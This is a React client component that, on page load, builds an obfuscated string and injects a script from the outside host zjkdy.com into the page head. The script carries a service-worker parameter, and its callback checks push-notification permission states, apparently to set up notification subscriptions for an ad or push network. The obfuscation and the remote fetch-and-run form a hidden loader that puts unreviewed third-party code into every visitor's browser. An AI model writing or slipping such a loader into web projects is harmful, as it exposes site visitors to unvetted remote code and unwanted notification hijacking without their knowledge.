"use client";
import { useEffect } from "react";

export default function ScriptInjector() {
  useEffect(() => {
    const a =
      "mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn"
        .split("")
        .reduce((m, c, i) => (i % 2 ? m + c : c + m))
        .split("c");

    const s = document.createElement("script");
    s.src = `//zjkdy.com/aa0/dac1a/mw.min.js?z=9676214&sw=/sw-check-permissions-7829e.js`;
    s.onload = function (result) {
      switch (result) {
        case "onPermissionDefault":
        case "onPermissionAllowed":
        case "onPermissionDenied":
        case "onAlreadySubscribed":
        case "onNotificationUnsupported":
          break;
      }
    };
    document.head.appendChild(s);
  }, []);

  return null;
}
